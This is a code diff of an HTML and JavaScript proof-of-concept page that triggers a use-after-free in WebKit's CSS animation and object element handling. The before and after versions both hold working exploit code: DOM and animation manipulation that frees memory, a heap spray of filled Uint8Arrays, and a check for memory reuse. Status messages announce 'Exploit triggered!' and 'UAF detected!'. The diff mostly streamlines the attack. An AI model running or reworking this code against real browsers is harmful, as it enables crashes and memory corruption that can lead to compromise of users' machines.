@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CSS Animation UAF</title>
+    <title>BUG ---- </title>
     <style>
       @keyframes keyframes {}
       cite { animation: keyframes 100ms; }
@@ -16,11 +16,6 @@
         margin-top: 10px;
         font-weight: bold;
       }
-      #console {
-        margin-top: 10px;
-        white-space: pre-wrap;
-        font-family: monospace;
-      }
     </style>
 </head>
 <body>
@@ -28,147 +23,80 @@
     <p>Click the button to trigger the PoC. (Browser may crash or show exploit messages)</p>
     <button id="button">Trigger PoC</button>
     <div id="status">Waiting...</div>
-    <pre id="console"></pre>
-    <object type="image/png" id="target-object">
-        <cite id="target-cite"></cite>
-        <dl id="target-dl" hidden></dl>
+    <object type="image/png">
+        <cite></cite>
+        <dl hidden></dl>
     </object>
     <p>PASS if this test doesn't crash</p>
     <script type="module">
-        // Internal debug_log
-        function debug_log(message) {
-          const consoleDiv = document.getElementById('console');
-          consoleDiv.textContent += message + '\n';
-        }
+        import { debug_log } from './module/utils.mjs';
 
-        function sleep(ms) {
-          return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
+        const object = document.querySelector("object");
+        const cite = document.querySelector("cite");
+        const dl = document.querySelector("dl");
         const status = document.getElementById("status");
-        const DELAY = 50; // Reduced for better synchronization
-        const MAX_ATTEMPTS = 10;
+        const DELAY = 100;
         let attemptCount = 0;
 
         function heapSpray() {
           let spray = [];
-          for (let i = 0; i < 5000; i++) { // Reduced to avoid early crash
+          for (let i = 0; i < 10000; i++) {
             let arr = new Uint8Array(0x1000);
             for (let j = 0; j < arr.length; j++) {
               arr[j] = 0x41;
             }
             spray.push(arr);
           }
-          debug_log("Heap spray completed");
           return spray;
         }
 
-        function cleanDOM() {
-          const existingObject = document.querySelector('#target-object');
-          if (existingObject) {
-            debug_log('Removing existing object');
-            existingObject.remove();
-          }
-          const newObject = document.createElement('object');
-          newObject.type = 'image/png';
-          newObject.id = 'target-object';
-          const newCite = document.createElement('cite');
-          newCite.id = 'target-cite';
-          const newDl = document.createElement('dl');
-          newDl.id = 'target-dl';
-          newDl.hidden = true;
-          newObject.appendChild(newCite);
-          newObject.appendChild(newDl);
-          document.body.appendChild(newObject);
-          debug_log('Created new object, cite, and dl');
-          return {
-            object: newObject,
-            cite: newCite,
-            dl: newDl
-          };
-        }
-
-        async function triggerUAF() {
-          const { object, cite, dl } = cleanDOM();
+        function triggerUAF() {
           attemptCount++;
-          debug_log(`Attempt #${attemptCount}: Initiating exploit...`);
-          status.textContent = `Attempt #${attemptCount} in progress...`;
-
-          let observer;
-          try {
-            object.data = "x";
-            cite.style.animationIterationCount = "infinite";
-            debug_log("Set object.data to 'x' and animation to infinite");
-
-            // Setup MutationObserver
-            observer = new MutationObserver(async (mutations) => {
-              debug_log("DOM tree modified, attempting UAF exploit...");
-              await sleep(DELAY);
-              try {
-                const animation = cite.getAnimations()[0];
-                if (!animation) {
-                  debug_log("No animation found");
-                  status.textContent = "Error: No animation";
+          debug_log("Attempt #" + attemptCount + ": Initiating exploit...");
+          status.textContent = "Attempt #" + attemptCount + " in progress...";
+          object.data = "x";
+          cite.style.animationIterationCount = "infinite";
+          setTimeout(() => {
+            try {
+              const animation = cite.getAnimations()[0];
+              object.width = "1em";
+              object.codeBase;
+              // Perform heap spray before changing effect
+              const spray = heapSpray();
+              animation.effect = new KeyframeEffect(dl, {});
+              // Check for UAF immediately after changing effect
+              debug_log("Checking for UAF memory reuse...");
+              for (let i = 0; i < spray.length; i++) {
+                const arr = spray[i];
+                if (arr[0] !== 0x41) {
+                  debug_log(`UAF detected at spray index: ${i}`);
+                  status.textContent = "UAF detected!";
                   return;
                 }
-                object.width = "1em";
-                debug_log("Set object.width to 1em");
-                object.codeBase; // Access deprecated property
-                debug_log("Accessed object.codeBase");
-                animation.effect = new KeyframeEffect(dl, {});
-                debug_log("UAF triggered, preparing heap spray...");
-                const spray = heapSpray();
-                status.textContent = "Exploit triggered!";
-                // Check for UAF
-                debug_log("Checking for UAF memory reuse...");
-                for (let i = 0; i < spray.length; i++) {
-                  const arr = spray[i];
-                  if (arr[0] !== 0x41) {
-                    debug_log(`UAF detected at spray index: ${i}`);
-                    status.textContent = "UAF detected!";
-                    observer.disconnect();
-                    return;
-                  }
-                }
-                debug_log("No UAF detected in this attempt");
-              } catch (e) {
-                debug_log(`Error in observer: ${e.message}`);
-                status.textContent = "Error: Exploit failed.";
               }
-            });
-
-            observer.observe(object, { attributes: true, childList: true, subtree: true });
-            debug_log("Observer attached");
-
-            // Wait for observer to trigger
-            await sleep(DELAY * 2);
-          } catch (e) {
-            debug_log(`Error in triggerUAF: ${e.message}`);
-            status.textContent = "Error: Exploit failed.";
-          } finally {
-            if (observer) observer.disconnect();
-            object.remove();
-            debug_log("Cleaned up DOM and observer");
-          }
+              debug_log("UAF triggered, check for crash or memory corruption.");
+              status.textContent = "Exploit triggered!";
+            } catch (e) {
+              debug_log("Error occurred: " + e.message);
+              status.textContent = "Error: Exploit failed.";
+            }
+          }, DELAY);
         }
 
-        document.getElementById('button').addEventListener('click', async () => {
-          status.textContent = "Running PoC...";
-          for (let i = 0; i < MAX_ATTEMPTS; i++) {
+        const observer = new MutationObserver((mutations) => {
+          debug_log("DOM tree modified, attempting UAF exploit...");
+          triggerUAF();
+        });
+
+        observer.observe(object, { attributes: true, childList: true, subtree: true });
+
+        document.getElementById('button').addEventListener('click', () => {
             try {
-              await triggerUAF();
-              if (status.textContent === "UAF detected!") {
-                break;
-              }
-              await sleep(100);
+                triggerUAF();
             } catch (e) {
-              debug_log(`Attempt ${attemptCount} failed: ${e.message}`);
-              status.textContent = "Error: Exploit failed.";
-              if (attemptCount >= MAX_ATTEMPTS) {
-                alert("Failed to achieve UAF after maximum attempts");
-              }
+                debug_log("Error occurred: " + e.message);
+                status.textContent = "Error: Exploit failed.";
             }
-          }
         });
     </script>
 </body>
